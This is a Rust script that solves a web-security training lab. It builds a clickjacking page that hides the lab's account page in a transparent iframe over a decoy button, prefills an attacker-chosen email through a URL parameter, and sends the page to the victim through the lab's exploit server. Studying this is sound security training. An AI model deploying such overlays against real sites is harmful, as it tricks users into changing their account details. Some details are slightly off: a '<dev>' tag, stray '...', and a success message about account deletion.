/**************************************************************************
*
* Lab: Clickjacking with form input data prefilled from a URL parameter
*
* Hack Steps:
*      1. Adjust the frame dimensions and the decoy button offset
*      2. Set the email field using a URL query parameter
*      3. Deliver the exploit to the victim
*
***************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a1600c403eb388f8233247600c500a2.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0ac000da0396389d829b23e6013400f6.exploit-server.net";

fn main() {
    print!("❯❯ Delivering the exploit to the victim.. ");
    io::stdout().flush().unwrap();

    let frame_width = 700;
    let frame_height = 700;
    let decoy_button_top = 450;
    let decoy_button_left = 100;
    let new_email = "hacked@you.com"; // You can change this to what you want
    let payload = format!(
        r###"<head>
                <style>
                    #target_website {{
                        position: relative;
                        width: {frame_width}px;
                        height: {frame_height}px;
                        opacity: 0.0001;
                        z-index: 2;
                        }}
                    #decoy_website {{
                        position: absolute;
                        top: {decoy_button_top}px;
                        left: {decoy_button_left}px;
                        z-index: 1;
                        }}
                </style>
            </head>
            ...
            <body>
                <dev id="decoy_website"> Click me </dev>
                <iframe id="target_website" src="{LAB_URL}/my-account?email={new_email}"></iframe>
            </body>"###
    );
    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The victim's account will be deleted after clicking on the decoy button");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_exploit_to_victim(payload: &str) {
    let client = build_web_client();
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
